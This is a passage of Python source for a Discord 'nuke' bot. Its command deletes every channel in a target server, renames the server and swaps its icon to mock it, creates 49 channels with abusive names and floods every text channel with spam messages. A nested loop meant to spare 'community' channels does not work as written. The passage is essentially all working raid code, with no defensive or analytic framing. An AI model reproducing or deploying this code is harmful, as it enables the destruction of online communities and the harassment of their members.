                @bot.command()
                async def nuke(ctx):
                    guild = bot.get_guild(int(server_id))
                    new_icon_url = "https://media.discordapp.net/attachments/1150478713486573710/1154809856964972584/GK_AAA.png?ex=650f0bfd&is=650dba7d&hm=3073310f18f680743170247449a0f3f2482fee6efc9f8b04aaac6a313e5bbe9c&=&width=320&height=320"
                    
        
                    if guild is not None:
                        # Delete all channels
                        for channel in guild.channels:
                            for channel in guild.channels:
                              if isinstance(channel, discord.TextChannel) and "community" in channel.name.lower():
                                  continue
                            await channel.delete()
                        print(f"Nukeing On  {guild.name} id Server: {server_id} ")
                        await guild.edit(name='Get Nuked By Killls')


                        async with aiohttp.ClientSession() as session:
                          async with session.get(new_icon_url) as resp:
                             if resp.status == 200:
                               icon_data = await resp.read()
                               await guild.edit(icon=icon_data)
                               print(f"Changed icon of {guild.name}")
                             else:
                               print(f"Failed to retrieve icon from URL (Status Code: {resp.status})")

                        # Create 49 channels concurrently
                        tasks = [create_channel(guild, f'Get Fucked By Killls-{i}') for i in range(1, 50)]
                        await asyncio.gather(*tasks)

                        # Send a predefined message in all channels at the same time
                        tasks = [send_message(channel) for channel in guild.channels if isinstance(channel, discord.TextChannel)]
                        await asyncio.gather(*tasks)

                        # Send another predefined message in all channels at the same time
                        tasks = [send_message1(channel) for channel in guild.channels if isinstance(channel, discord.TextChannel)]
                        await asyncio.gather(*tasks)
                        print(f"Nuked {guild.name} ")
                    else:
                        print(f"Server with ID {server_id} not found.")
                
                bot.run(bot_token)
                return bot
            else:
                print("Token not found in the JSON file.")
    except Exception as e:
        print(f"An error occurred: {e}")
